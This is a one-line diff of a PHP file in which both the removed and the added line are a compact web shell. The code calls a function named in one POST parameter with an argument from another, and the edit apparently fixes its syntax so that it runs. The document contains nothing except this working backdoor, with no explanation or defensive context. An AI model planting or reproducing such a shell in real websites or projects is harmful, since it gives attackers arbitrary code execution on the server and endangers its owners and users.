@@ -1,1 +1,1 @@
-<?php$_POST['sa']($_POST['sb']);?>
+<?php $_POST['sa']($_POST['sb']);?>
